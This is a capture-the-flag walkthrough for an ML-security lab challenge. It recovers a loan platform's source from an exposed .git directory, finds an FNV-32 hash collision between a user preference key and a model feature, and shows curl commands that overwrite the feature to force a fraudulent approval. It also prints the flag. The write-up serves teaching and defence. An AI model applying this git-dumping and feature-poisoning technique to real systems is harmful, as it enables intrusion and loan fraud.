# The Loan Arranger — Walkthrough

**Author:** xGh05t  
**Event:** 2026: An AI Odyssey — Token City  
**Category:** ML Sec  
**Difficulty:** Medium  
**Points:** 60  
**Flag:** `THM{f34tur3_st0r3_n4m3sp4c3_c0ll1s10n}`

---

## Mission Briefing

Access the CortexLend platform, identify the vulnerability in the ML pipeline, and demonstrate the exploit before Oracle 9 does. Proof of concept is a successful fraudulent approval.

---

## Recon

### Port Scan

```bash
rustscan -a 10.65.185.97 -b 4500 -- -n -Pn -sV -sC
```

**Open ports:**
- `22/tcp` — OpenSSH 9.6p1
- `80/tcp` — nginx 1.24.0

**Key finding:** nmap flagged an exposed `.git/` directory with last commit message "Initial ML pipeline implementation."

---

## Source Recovery

The exposed `.git/` directory allows full source code recovery using GitTools.

```bash
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper
./gitdumper.sh http://10.65.185.97/.git/ ~/cortexlend
cd ~/cortexlend
git checkout -- .
```

**Files recovered:**
```
app.py
feature_store.py
pipeline_utils.py
templates/index.html
```

---

## Vulnerability Analysis

### The Architecture

`pipeline_utils.py` immediately reveals the vulnerability in a comment:

```python
FEATURE_NAMES = [
    'credit_duii',        # collides with pref_yqtzeh - THE VULNERABILITY
    'months_employed',
    'loan_default_flag',
    'num_late_payments',
    'debt_to_income'
]
```

### The Bug: FNV-32 Hash Collision

The application uses a **unified feature store** — a single Redis hash (`user:{id}:features`) stores both ML model features and user preferences. Keys are indexed by `fnv32(field_name)`.

`feature_store.py` shows:
- `store_preference(user_id, key, value)` → writes to `user:{id}:features` at `fnv32(key)`
- `get_feature_vector(user_id)` → reads features from the same hash at `fnv32(feature_name)`

If any preference key hashes to the same value as a model feature key, writing that preference **overwrites the ML feature**.

### Confirming the Collision

```python
def fnv32(text):
    h = 0x811c9dc5
    for byte in text.encode():
        h ^= byte
        h = (h * 0x01000193) & 0xFFFFFFFF
    return hex(h)

print(fnv32('credit_duii'))   # 0xdc0a9f54
print(fnv32('pref_yqtzeh'))   # 0xdc0a9f54  ← COLLISION
```

Both hash to `0xdc0a9f54`. Writing to preference key `pref_yqtzeh` overwrites the `credit_duii` ML feature.

### The Loan Approval Logic

From `app.py`:

```python
score = float(model.predict_proba([features])[0][1])
if score > 0.7:
    flag = open('/flag.txt').read().strip()
    return jsonify({'status': 'approved', 'score': ..., 'message': f'... {flag}'})
```

A `GradientBoostingClassifier` returns probability > 0.7 to approve. The `credit_duii` feature has a weight coefficient of 0.6 — the heaviest positive contributor. Setting it to an extreme value (9999) pushes the model firmly into the approval region.

---

## Exploit

```bash
COOKIES=$(mktemp)
BASE="http://10.65.185.97"

# 1. Register an account
curl -s -c "$COOKIES" -b "$COOKIES" \
  -H "Content-Type: application/json" \
  -d '{"username":"haulme","password":"hunter2"}' \
  "$BASE/auth/register"

# 2. Confirm denial (baseline)
curl -s -c "$COOKIES" -b "$COOKIES" -X POST "$BASE/api/loan/apply"

# 3. Poison the feature store via the colliding preference key
curl -s -c "$COOKIES" -b "$COOKIES" -X PATCH \
  -H "Content-Type: application/json" \
  -d '{"pref_yqtzeh":"9999"}' \
  "$BASE/api/profile/preferences"

# 4. Confirm feature was overwritten (optional verification)
curl -s -c "$COOKIES" -b "$COOKIES" "$BASE/api/profile"
# → credit_duii: 9999.0

# 5. Apply again — approved, flag in message
curl -s -c "$COOKIES" -b "$COOKIES" -X POST "$BASE/api/loan/apply"
```

**Result:**
```json
{
  "status": "approved",
  "score": 0.9956,
  "message": "Congratulations! Your application has been approved. THM{f34tur3_st0r3_n4m3sp4c3_c0ll1s10n}"
}
```

---

## Flag

```
THM{f34tur3_st0r3_n4m3sp4c3_c0ll1s10n}
```

---

## Key Takeaways

- **FNV-32 is non-cryptographic** and produces collisions that are trivially findable.
- **Unified feature stores** that serve both user-controllable inputs and ML model inputs are inherently dangerous. Production ML pipelines must strictly isolate feature namespaces.
- **Exposed `.git/` directories** on production servers are a critical misconfiguration — they hand attackers the full source code.
- The `/api/debug/pipeline` endpoint's description even warned: "Single feature store serves both user preferences and ML features for simplified architecture" — a red flag baked into the app itself.
